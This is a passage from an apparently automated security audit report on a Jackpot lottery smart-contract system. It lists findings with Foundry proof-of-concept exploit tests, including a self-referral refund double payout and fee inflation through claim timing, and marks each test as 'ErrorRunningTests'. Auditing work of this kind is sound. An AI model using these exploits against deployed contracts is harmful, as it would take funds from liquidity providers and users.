2) The user waits until drawing #2 is active and then calls claimWinnings([ticketId]).
3) _payReferrersWinnings() adds the referrerShare (winningAmount * referralWinShare) to drawingState[currentDrawingId=2].lpEarnings instead of drawing #1.
4) When drawing #2 settles, _transferProtocolFee() observes inflated lpEarnings despite userWinnings2 being small/zero, and transfers protocol fees to protocolFeeAddress. This fee would not have been charged without the time-shift, causing LP loss and breaking per-round conservation.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockEntropyProvider is IScaledEntropyProvider {
    uint256[5] public normals;
    uint256 public bonus;
    constructor(uint256[5] memory _normals, uint256 _bonus) { normals = _normals; bonus = _bonus; }
    function requestAndCallbackScaledRandomness(
        uint32,
        SetRequest[] memory,
        bytes4 _selector,
        bytes memory _context
    ) external payable returns (uint64) {
        uint256[][] memory out = new uint256[][](2);
        out[0] = new uint256[](5);
        for (uint256 i; i < 5; i++) out[0][i] = normals[i];
        out[1] = new uint256[](1);
        out[1][0] = bonus;
        (bool ok, ) = msg.sender.call(abi.encodeWithSelector(_selector, bytes32(0), out, _context));
        require(ok, "cb fail");
        return 0;
    }
    function getFee(uint32) external pure returns (uint256) { return 0; }
}

contract MockPayoutCalculator is IPayoutCalculator {
    uint256 public defaultPayout;
    mapping(uint256 => mapping(uint256 => uint256)) public p;
    function setDefault(uint256 v) external { defaultPayout = v; }
    function calculateAndStoreDrawingUserWinnings(
        uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory
    ) external pure returns (uint256) {
        return 0; // keep userWinnings=0 for simplicity
    }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256 _drawingId, uint256 _tierId) external view returns (uint256) {
        uint256 v = p[_drawingId][_tierId];
        return v == 0 ? defaultPayout : v;
    }
}

contract NoReferralCreditTimeShiftTest is Test {
    Jackpot jackpot;
    JackpotLPManager lpMan;
    JackpotTicketNFT nft;
    MockUSDC usdc;
    MockEntropyProvider entropy;
    MockPayoutCalculator payout;

    address deployer = address(this);
    address lp = address(0xBEEF);
    address player = address(0xCAFE);

    uint8 constant NORMAL_MAX = 10;

    function setUp() public {
        jackpot = new Jackpot(
            1,              // drawingDurationInSeconds
            NORMAL_MAX,     // normalBallMax
            1,              // bonusballMin
            5e16,           // lpEdgeTarget = 5%
            1e17,           // reserveRatio = 10%
            0,              // referralFee (purchase)
            5e17,           // referralWinShare = 50%
            2e17,           // protocolFee = 20%
            0,              // protocolFeeThreshold = 0
            1e6,            // ticketPrice = 1 USDC
            3,              // maxReferrers
            100000          // entropyBaseGasLimit
        );
        lpMan = new JackpotLPManager(jackpot);
        nft = new JackpotTicketNFT(jackpot);
        usdc = new MockUSDC();
        uint256[5] memory wins = [uint256(1),2,3,4,5];
        entropy = new MockEntropyProvider(wins, 1);
        payout = new MockPayoutCalculator();
        payout.setDefault(100e6); // every tier pays 100 USDC

        jackpot.initialize(IERC20(address(usdc)), lpMan, nft, IScaledEntropyProvider(address(entropy)), IPayoutCalculator(address(payout)));
        jackpot.initializeLPDeposits(1_000_000_000e6);

        usdc.mint(lp, 1_000_000e6);
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(1000e6); // 1,000 USDC LP deposit
        vm.stopPrank();

        jackpot.initializeJackpot(block.timestamp - 10); // drawing #1 ready

        usdc.mint(player, 1000e6);
        vm.prank(player);
        usdc.approve(address(jackpot), type(uint256).max);
    }

    function test_NoReferralRefShareTimeShiftInflatesNextRoundFees() public {
        // Buy a winning ticket in drawing #1 with no referral scheme
        IJackpot.Ticket[] memory ts = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        for (uint8 i = 0; i < 5; i++) normals[i] = i+1; // 1..5
        ts[0] = IJackpot.Ticket({ normals: normals, bonusball: 1 });
        vm.prank(player);
        uint256[] memory ids = jackpot.buyTickets(ts, player, new address[](0), new uint256[](0), bytes32("SRC"));

        // Run drawing #1 -> settles and advances to drawing #2
        jackpot.runJackpot{value: 0}();
        assertEq(jackpot.currentDrawingId(), 2, "advanced to drawing 2");

        // Before claim, lpEarnings in drawing #2 should be 0
        Jackpot.DrawingState memory d2Before = jackpot.getDrawingState(2);
        assertEq(d2Before.lpEarnings, 0, "lpEarnings(2) initially 0");

        // Claim in drawing #2 (time-shift). No referral => referrerShare booked into currentDrawingId (2)
        uint256 winAmount = 100e6;
        uint256 refShare = (winAmount * 5e17) / 1e18; // 50 USDC
        vm.prank(player);
        jackpot.claimWinnings(ids);

        // Verify lpEarnings accrued to drawing #2 (not #1)
        Jackpot.DrawingState memory d2After = jackpot.getDrawingState(2);
        assertEq(d2After.lpEarnings, refShare, "referrerShare credited to drawing 2 lpEarnings");

        // Run drawing #2: with userWinnings2=0, protocol fee is charged on inflated lpEarnings
        uint256 protoBefore = usdc.balanceOf(jackpot.protocolFeeAddress());
        jackpot.runJackpot{value: 0}();
        uint256 protoAfter = usdc.balanceOf(jackpot.protocolFeeAddress());
        uint256 expectedFee = (refShare * 2e17) / 1e18; // 20% of 50 = 10 USDC
        assertEq(protoAfter - protoBefore, expectedFee, "protocol fee charged on shifted funds");
    }
}


## Suggested Mitigation
Do not count the no-referral referrerShare as part of the claim-time round’s lpEarnings (the protocol-fee base). Instead:
- Add a new per-drawing accumulator (e.g., drawingState[currentDrawingId].lpNonFeeCredits) that tracks credits arising from no-referral winnings claims during the round.
- In _payReferrersWinnings, when _referralSchemeId == 0x0, increment lpNonFeeCredits (not lpEarnings).
- In scaledEntropyCallback, compute protocol fees on (lpEarnings − lpNonFeeCredits), clamping at zero if needed, e.g.:
  • uint256 feeBase = currentDrawingState.lpEarnings > currentDrawingState.lpNonFeeCredits ? (currentDrawingState.lpEarnings - currentDrawingState.lpNonFeeCredits) : 0;
  • protocolFeeAmount = _transferProtocolFee(feeBase, drawingUserWinnings).
- Still pass the full value (lpEarnings + lpNonFeeCredits) to LPManager.processDrawingSettlement so LPs receive the economic benefit, but those credits do not distort protocol fee assessment nor any logic derived from lpEarnings.
This preserves LP value, eliminates fee gaming via claim timing, and avoids minting shares to the Jackpot contract or mis-attributing to past drawings. If storage changes are acceptable, also emit a new event (LpNonFeeCreditsUpdated) for transparency.





 **Derived From** : Price desync: BridgeManager charges global ticketPrice, stranding overpayments

## [H-16]. BridgeManager.buyTickets over/undercharges due to desynced global vs per‑drawing ticket price, causing stranded USDC or DoS

### Finding Severity Justification: BridgeManager.buyTickets charges using the global Jackpot.ticketPrice() instead of the per-drawing snapshotted price stored in drawingState[currentDrawingId].ticketPrice. When governance updates ticketPrice mid‑drawing (which is allowed and intended to affect only future drawings), cross‑chain buyers can be overcharged with the surplus USDC becoming permanently stranded in JackpotBridgeManager (no refund/sweep path), or undercharged causing the purchase to revert (DoS). This results in direct user fund loss and service disruption under realistic operational conditions.
## Derived From Pattern/Invariant
Price desync: BridgeManager charges global ticketPrice, stranding overpayments

## Exploit Type
AccountingInvariantViolation

## Location
JackpotBridgeManager.buyTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager.buyTickets() calculates `ticketCost` using the global Jackpot.ticketPrice(), then pulls that amount from the caller and approves Jackpot. However, Jackpot.buyTickets() charges the snapshotted per‑drawing price stored in `drawingState[currentDrawingId].ticketPrice`. If governance updates the global ticketPrice mid‑drawing (allowed for next drawing), the two prices diverge. Overcharge: global > snapshot. BridgeManager pulls more USDC than Jackpot transfers; the surplus remains stuck in BridgeManager because there is no sweep/refund path. Undercharge: global < snapshot. Jackpot attempts to transfer more than BridgeManager approved/balanced and reverts, DoSing bridge purchases. Vulnerable snippet in BridgeManager:

function buyTickets(...) {
  uint256 ticketPrice = jackpot.ticketPrice();
  uint256 ticketCost = ticketPrice * _tickets.length;
  usdc.safeTransferFrom(msg.sender, address(this), ticketCost);
  usdc.approve(address(jackpot), ticketCost);
  jackpot.buyTickets(...); // charges drawingState[currentDrawingId].ticketPrice
}

## Impact
Users can be overcharged and the excess USDC is permanently stranded in BridgeManager (loss of funds). If global price is lower than the current drawing price, bridge purchases revert, causing a DoS to cross‑chain buyers.

## Command to Run Test


## Proof of Concept
1) Initialize the jackpot and start drawing N.
2) Record snapshot price P_snap = drawingState[currentDrawingId].ticketPrice.
3) Governance updates global Jackpot.ticketPrice to P_global != P_snap.
4a) Overcharge case: P_global > P_snap. A user buys 1 ticket via BridgeManager. BridgeManager pulls P_global from user and approves Jackpot; Jackpot transfers only P_snap. The remaining (P_global - P_snap) stays on BridgeManager.
4b) Undercharge case: P_global < P_snap. User buys 1 ticket via BridgeManager. BridgeManager pulls and approves P_global, but Jackpot tries to transfer P_snap > P_global and the call reverts, DoSing bridge purchases.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Relative imports to local contracts
import {Jackpot} from "../contracts/Jackpot.sol";
import {JackpotLPManager} from "../contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "../contracts/JackpotTicketNFT.sol";
import {JackpotBridgeManager} from "../contracts/JackpotBridgeManager.sol";
import {IJackpot} from "../contracts/interfaces/IJackpot.sol";
import {IPayoutCalculator} from "../contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "../contracts/interfaces/IScaledEntropyProvider.sol";

contract ERC20Mock is ERC20 {
    uint8 private _decimals;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _decimals = d; }
    function decimals() public view override returns (uint8) { return _decimals; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

// Lightweight stubs to avoid heavy dependencies
contract DummyPayout is IPayoutCalculator {
    function calculateAndStoreDrawingUserWinnings(
        uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory
    ) external pure returns (uint256) { return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256, uint256) external pure returns (uint256) { return 0; }
}

contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(
        uint32, SetRequest[] memory, bytes4, bytes memory
    ) external payable returns (uint64) { return 1; }
    function getFee(uint32) external view returns (uint256) { return 0; }
}

contract BridgeTicketPriceDesyncTest is Test {
    ERC20Mock usdc;
    Jackpot jackpot;
    JackpotLPManager lpManager;
    JackpotTicketNFT nft;
    DummyPayout payout;
    DummyEntropy entropy;
    JackpotBridgeManager bridge;

    address lp = address(0xBEEF);
    address relayer = address(0xCAFE);
    address user = address(0xF00D);

    uint256 constant USDC_UNIT = 1e6;

    function setUp() public {
        usdc = new ERC20Mock("USDC", "USDC", 6);

        jackpot = new Jackpot(
            1 days,
            35,            // normalBallMax
            5,             // bonusballMin
            2e17,          // lpEdgeTarget = 20%
            1e17,          // reserveRatio = 10%
            0,             // referralFee
            0,             // referralWinShare
            0,             // protocolFee
            0,             // protocolFeeThreshold
            1 * USDC_UNIT, // ticketPrice = 1 USDC
            5,             // maxReferrers
            500_000        // entropyBaseGasLimit
        );

        lpManager = new JackpotLPManager(IJackpot(address(jackpot)));
        nft = new JackpotTicketNFT(IJackpot(address(jackpot)));
        payout = new DummyPayout();
        entropy = new DummyEntropy();

        jackpot.initialize(IERC20(address(usdc)), lpManager, nft, entropy, payout);
        jackpot.initializeLPDeposits(1_000_000 * USDC_UNIT);

        usdc.mint(lp, 1_000 * USDC_UNIT);
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(500 * USDC_UNIT);
        vm.stopPrank();

        jackpot.initializeJackpot(block.timestamp);

        bridge = new JackpotBridgeManager(IJackpot(address(jackpot)), nft, IERC20(address(usdc)), "Bridge", "1");
    }

    function _ticket() internal pure returns (IJackpot.Ticket[] memory t) {
        t = new IJackpot.Ticket[](1);
        t[0].normals = new uint8[](5);
        t[0].normals[0] = 1;
        t[0].normals[1] = 2;
        t[0].normals[2] = 3;
        t[0].normals[3] = 4;
        t[0].normals[4] = 5;
        t[0].bonusball = 1;
    }

    function test_Overcharge_surplusGetsStrandedInBridge() public {
        uint256 currentId = jackpot.currentDrawingId();
        Jackpot.DrawingState memory ds = jackpot.getDrawingState(currentId);
        uint256 snapPrice = ds.ticketPrice; // per-drawing snapshot

        // Governance increases global ticketPrice mid-drawing (affects next drawing, not this one)
        jackpot.setTicketPrice(snapPrice * 2); // global > snapshot

        IJackpot.Ticket[] memory tickets = _ticket();
        uint256 globalCost = jackpot.ticketPrice() * tickets.length; // 2x snapshot

        usdc.mint(relayer, globalCost);
        vm.startPrank(relayer);
        usdc.approve(address(bridge), globalCost);
        bridge.buyTickets(tickets, user, new address[](0), new uint256[](0), bytes32("SRC"));
        vm.stopPrank();

        uint256 leftover = usdc.balanceOf(address(bridge));
        assertGt(leftover, 0, "surplus should be stranded on BridgeManager");
        assertEq(leftover, globalCost - snapPrice * tickets.length, "leftover equals overcharge");
    }

    function test_Undercharge_bridgeBuyRevertsWhenGlobalBelowSnapshot() public {
        uint256 currentId = jackpot.currentDrawingId();
        uint256 snapPrice = jackpot.getDrawingState(currentId).ticketPrice;

        jackpot.setTicketPrice(snapPrice / 2); // global < snapshot

        IJackpot.Ticket[] memory tickets = _ticket();
        uint256 globalCost = jackpot.ticketPrice() * tickets.length; // half snapshot

        usdc.mint(relayer, globalCost);
        vm.startPrank(relayer);
        usdc.approve(address(bridge), globalCost);
        // Jackpot will attempt to pull `snapPrice`, but allowance/balance is only `globalCost` -> revert
        vm.expectRevert();
        bridge.buyTickets(tickets, user, new address[](0), new uint256[](0), bytes32("SRC2"));
        vm.stopPrank();
    }
}


## Suggested Mitigation
In JackpotBridgeManager.buyTickets(), compute and pay the exact per-drawing cost instead of using the global Jackpot.ticketPrice():
- Read the current drawing’s snapshotted price and multiply by the ticket count: cost = jackpot.getDrawingState(jackpot.currentDrawingId()).ticketPrice * _tickets.length. Expose a dedicated getter (e.g., getCurrentDrawingTicketPrice()) or add getDrawingState/currentDrawingId to IJackpot so the bridge can read the snapshot.
- Pull exactly this amount from msg.sender and approve exactly this amount to Jackpot before calling jackpot.buyTickets.
- Optionally, after the call, if any unexpected USDC remains due to edge cases, immediately refund the surplus to msg.sender to avoid stranded balances.
This ensures: no overcharge/stranded funds when governance updates ticketPrice mid-drawing, and no undercharge/DoS due to insufficient allowance.





 **Derived From** : forall t in returned ticketIds: IERC721(address(jackpotTicketNFT)).ownerOf(t) == address(this) && ticketOwner[t] == _recipient

## [L-17]. Anyone can mint tickets to BridgeManager and desync custody vs ticketOwner mapping, permanently orphaning tickets

### Finding Severity Justification: Anyone can call Jackpot.buyTickets with recipient = JackpotBridgeManager, minting NFTs to the bridge without populating its ticketOwner mapping. This creates untracked (orphan) tickets that cannot be claimed or transferred via BridgeManager’s flows. However, the attacker must pay full ticket cost; no assets are stolen and no external user funds are put at risk. Economic impact to LPs is not greater than normal ticket purchases (settlement accounts winners regardless of later claims), and this does not meaningfully DoS the system. The issue is a design/UX pitfall causing permanently stuck tickets, not a drain.
## Derived From Pattern/Invariant
forall t in returned ticketIds: IERC721(address(jackpotTicketNFT)).ownerOf(t) == address(this) && ticketOwner[t] == _recipient

## Exploit Type
EventConsistency

## Location
JackpotBridgeManager.buyTickets

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless




 **Derived From** : Emergency refunds use current referralFee instead of purchase-time value, over/under-refunding

## [M-18]. Emergency refunds mis-account referred tickets by using mutable referralFee, enabling refund+referral double-payout

### Finding Severity Justification: Emergency refunds for referred tickets use the mutable global referralFee instead of the purchase-time value, allowing over-refunds (and under-refunds) when referralFee changes mid-drawing or after enabling emergency mode. This can cause real loss of LP assets equal to the referral portion per refunded ticket, but only in emergency refunds and contingent on parameter changes, so impact is real but context-limited.
## Derived From Pattern/Invariant
Emergency refunds use current referralFee instead of purchase-time value, over/under-refunding

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.emergencyRefundTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Jackpot.emergencyRefundTickets computes refunds for referred tickets with the CURRENT global referralFee instead of the fee applied when the ticket was bought. Vulnerable code: refundAmount = ticketInfo.referralScheme == bytes32(0) ? drawingState[ticketInfo.drawingId].ticketPrice : drawingState[ticketInfo.drawingId].ticketPrice * (PRECISE_UNIT - referralFee) / PRECISE_UNIT;. The contract never snapshots referralFee per drawing or per ticket (unlike referralWinShare), so if governance changes referralFee mid‑drawing and later enables emergency mode, refunds become inconsistent with purchase-time economics. An attacker who bought with a nonzero referralFee and set themselves as referrer can get a full refund when referralFee is later set to 0 and also claim the previously accrued referral fees, yielding profit equal to referralFee_at_purchase * ticketPrice per ticket. This violates conservation (ticketRevenue ≠ refunds + referral payouts + LP earnings) and the shortfall is borne by the LP pool.

## Impact
LP pool loses the referral portion per refunded referred ticket when referralFee was reduced before refunds; attacker can profit by self-referring and claiming both full refund and referral fees.

## Command to Run Test


## Proof of Concept
1) Initial referralFee = 20%. 2) Attacker self-refers and buys a ticket (referralFees[attacker] credited with 20% of ticketPrice). 3) Owner later enables emergencyMode and (legitimately) updates referralFee to 0. 4) Attacker calls emergencyRefundTickets to get full ticketPrice refunded (uses current referralFee=0). 5) Attacker calls claimReferralFees to receive the 20% credited at purchase. Net profit = 20% of ticketPrice per ticket; LP funds cover the loss.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is IERC20 {
    string public name = "MockUSDC";
    string public symbol = "mUSDC";
    uint8 public decimals = 6;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function transfer(address to, uint256 amount) external override returns (bool){ require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; emit Transfer(msg.sender,to,amount); return true; }
    function approve(address spender, uint256 amount) external override returns (bool){ allowance[msg.sender][spender]=amount; emit Approval(msg.sender,spender,amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool){ require(balanceOf[from] >= amount, "bal"); uint256 a=allowance[from][msg.sender]; require(a>=amount, "allow"); if(a!=type(uint256).max){ allowance[from][msg.sender]=a-amount; } balanceOf[from]-=amount; balanceOf[to]+=amount; emit Transfer(from,to,amount); return true; }
}

contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64){ return 0; }
    function getFee(uint32) external view returns (uint256){ return 0; }
}

contract PayoutCalcMock is IPayoutCalculator {
    function calculateAndStoreDrawingUserWinnings(uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory) external pure returns (uint256){ return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256, uint256) external pure returns (uint256){ return 0; }
}

contract EmergencyRefundReferralFeeSnapshotTest is Test {
    uint256 constant PRECISE_UNIT = 1e18;
    MockERC20 usdc;
    Jackpot jackpot;
    JackpotLPManager lpMgr;
    JackpotTicketNFT nft;
    DummyEntropy entropy;
    PayoutCalcMock pc;

    address owner = address(this);
    address lp = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        usdc = new MockERC20();
        entropy = new DummyEntropy();
        pc = new PayoutCalcMock();

        // constructor params
        uint256 drawingDuration = 1 days;
        uint8 normalBallMax = 35;
        uint8 bonusballMin = 1;
        uint256 lpEdgeTarget = 1e17; // 10%
        uint256 reserveRatio = 1e17; // 10%
        uint256 referralFee = 2e17; // 20%
        uint256 referralWinShare = 1e17; // unused here
        uint256 protocolFee = 0;
        uint256 protocolFeeThreshold = 0;
        uint256 ticketPrice = 100e6; // 100 USDC
        uint256 maxReferrers = 1;
        uint32 entropyBaseGasLimit = 200000;

        jackpot = new Jackpot(
            drawingDuration,
            normalBallMax,
            bonusballMin,
            lpEdgeTarget,
            reserveRatio,
            referralFee,
            referralWinShare,
            protocolFee,
            protocolFeeThreshold,
            ticketPrice,
            maxReferrers,
            entropyBaseGasLimit
        );

        lpMgr = new JackpotLPManager(IJackpot(address(jackpot)));
        nft = new JackpotTicketNFT(IJackpot(address(jackpot)));

        jackpot.initialize(IERC20(address(usdc)), lpMgr, nft, IScaledEntropyProvider(address(entropy)), pc);

        // Initialize LP system
        jackpot.initializeLPDeposits(10_000_000e6);

        // Seed LP and attacker balances
        usdc.mint(lp, 1_000_000e6);
        usdc.mint(attacker, 1_000e6);

        // LP deposit
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(1_000_000e6);
        vm.stopPrank();

        // Initialize jackpot (creates drawingId=1 with nonzero prizePool)
        jackpot.initializeJackpot(block.timestamp + 3600);
    }

    function test_OverRefundAndDoublePayReferralOnFeeChange() public {
        // Attacker self-refers and buys 1 ticket when referralFee = 20%
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        tickets[0] = IJackpot.Ticket({normals: normals, bonusball: 1});

        address[] memory refs = new address[](1);
        refs[0] = attacker; // self-referral
        uint256[] memory splits = new uint256[](1);
        splits[0] = PRECISE_UNIT;

        vm.startPrank(attacker);
        uint256 attackerStart = usdc.balanceOf(attacker);
        usdc.approve(address(jackpot), type(uint256).max);
        uint256[] memory ids = jackpot.buyTickets(tickets, attacker, refs, splits, bytes32(0));
        vm.stopPrank();

        // Owner enables emergency mode and updates referralFee to 0
        jackpot.enableEmergencyMode();
        jackpot.setReferralFee(0);

        // Attacker refunds ticket -> gets FULL ticketPrice (uses current referralFee=0)
        vm.startPrank(attacker);
        uint256[] memory toRefund = new uint256[](1);
        toRefund[0] = ids[0];
        jackpot.emergencyRefundTickets(toRefund);
        vm.stopPrank();

        // Attacker then claims accrued referral fees from purchase-time (20%)
        vm.prank(attacker);
        jackpot.claimReferralFees();

        uint256 attackerEnd = usdc.balanceOf(attacker);

        // Profit must be > 0 (specifically ~20% of ticketPrice)
        assertGt(attackerEnd, attackerStart);

        // Sanity: jackpot paid at least ticketPrice back during refund
        // and additionally the referral fee when claimed, funded by LP pool.
        // Contract USDC decreased by >= referral portion.
        uint256 ticketPrice = jackpot.ticketPrice();
        // Attacker should have gained approximately referralFee_at_purchase * ticketPrice = 20 USDC
        assertEq(attackerEnd - attackerStart, (ticketPrice * 2e17) / 1e18);
    }
}


## Suggested Mitigation
Robustly decouple emergency refunds from the mutable global referralFee value. Recommended fix: (1) Add referralFee to DrawingState and set it in _setNewDrawingState using the then-current global referralFee. (2) In _validateAndTrackReferrals, compute referralFeeTotal using drawingState[currentDrawingId].referralFee (not the global). (3) In emergencyRefundTickets, compute refund using drawingState[ticketInfo.drawingId].referralFee. This ensures all tickets in a drawing are treated consistently even if governance changes referralFee mid-drawing or while emergency mode is active. Alternative: store the applied referral fee per ticket (e.g., an extra uint256 in JackpotTicketNFT.TrackedTicket set at mint) and use that per-ticket value during emergency refunds. If adopting the per-drawing snapshot approach, ensure governance changes to global referralFee only affect future drawings by never reading the global in buyTickets or emergency refunds.





 **Derived From** : Emergency refunds don’t reverse combo-tracker/prize-pool state → double-count and insolvency risk

## [L-19]. Refunded tickets still counted as winners after disabling emergency mode cause LP losses and underpaid winners

### Finding Severity Justification: Impact exists (LP pool debited for phantom winners; real winners underpaid) but it requires the trusted owner to enable emergency mode, allow refunds, and then disable emergency mode and settle the same drawing, which contradicts the documented intent: "Emergency mode is not intended to be recoverable." This makes it a governance/operator-misuse risk per Code4rena rules, capped at Low.
## Derived From Pattern/Invariant
Emergency refunds don’t reverse combo-tracker/prize-pool state → double-count and insolvency risk

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.emergencyRefundTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole





 **Derived From** : Pending requests never expire; permissionless storage bloat via failing callbacks

## [L-20]. Permanent storage bloat via stuck pending requests in ScaledEntropyProvider.requestAndCallbackScaledRandomness

### Finding Severity Justification: The issue enables permissionless storage growth by persisting large pending entries when the callback target reverts. However, attackers must pay the SSTORE and entropy fees, there is no direct loss of assets, and no protocol-critical functionality iterates over or depends on clearing these entries. Impact is limited to storage bloat and potential minor gas overhead, not fund loss or a proven system-wide DoS.
## Derived From Pattern/Invariant
Pending requests never expire; permissionless storage bloat via failing callbacks

## Exploit Type
Dos

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless





 **Derived From** : address(this).balance == 0

## [I-21]. Stranded ETH in ScaledEntropyProvider due to forced ETH with no recovery path

### Finding Severity Justification: The contract can receive ETH via selfdestruct and has no sweep/withdraw path, which can strand ETH. This does not affect protocol solvency, randomness flow, jackpot operations, or user/LP assets; it's non-impactful operationally and amounts would be from external senders only. No code relies on address(this).balance being zero, so impact is purely cosmetic/monitoring-related.
## Derived From Pattern/Invariant
address(this).balance == 0

## Exploit Type
UnexpectedEth

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless





 **Derived From** : for all i in _requests: _requests[i].withReplacement || (_requests[i].samples <= (_requests[i].maxRange - _requests[i].minRange + 1))

## [L-22]. Invalid no-replacement requests pass validation and brick entropy callbacks, locking downstream consumers (e.g., Jackpot)

### Finding Severity Justification: The contract misses a validation in _validateRequests() to ensure that when withReplacement == false, samples <= (maxRange - minRange + 1). This can cause entropyCallback to revert later when FisherYatesRejection.draw() enforces the invariant. Impact is limited to the requester losing the entropy fee and the request failing to deliver randomness; it does not directly endanger protocol funds. Affecting Jackpot would require it to submit an invalid request (e.g., normalBallMax < 5), which is a governance misconfiguration and thus a QA/governance risk per rules.
## Derived From Pattern/Invariant
for all i in _requests: _requests[i].withReplacement || (_requests[i].samples <= (_requests[i].maxRange - _requests[i].minRange + 1))

## Exploit Type
IntegerMath

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless



 **Derived From** : pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && pending[sequence].setRequests.length == _requests.length

## [M-23]. Provider switch lets attacker collide sequence keys and overwrite pending[sequence], hijacking/DoSing entropy callbacks

### Finding Severity Justification: Pending requests are keyed only by sequence and the provider parameter is ignored on callback. After an owner-permitted provider rotation, a permissionless caller can collide a new provider’s sequence with an old pending one and overwrite the stored callback/selector. This can hijack or, more commonly, DoS the legitimate entropy delivery (e.g., Jackpot never receives the callback and remains locked). This impacts protocol availability but does not directly steal funds, fitting Medium severity.
## Derived From Pattern/Invariant
pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && pending[sequence].setRequests.length == _requests.length

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider keys pending requests only by sequence (uint64) and ignores the provider dimension. On setEntropyProvider(), the new provider's sequence numbers commonly restart from a low value, so new requests can reuse an existing sequence still pending from the old provider. _storePendingRequest then overwrites pending[sequence].callback/selector and appends to setRequests without clearing it. This breaks the referential invariant (setRequests length != input; callback no longer original caller) and lets an attacker, after a provider rotation, drive the new provider's sequence up to the old pending sequence and overwrite it. When Pyth later calls back for the old sequence, ScaledEntropyProvider will deliver randomness to the attacker’s callback (or revert due to bloated setRequests), leaving the original consumer (e.g., Jackpot) without entropy and locking the drawing. Vulnerable snippet:

mapping(uint64 => PendingRequest) private pending; // no provider dimension

function _storePendingRequest(uint64 sequence, bytes4 _selector, bytes memory _context, SetRequest[] memory _setRequests) internal {
    pending[sequence].callback = msg.sender;        // overwrites previous
    pending[sequence].selector = _selector;         // overwrites previous
    pending[sequence].context = _context;
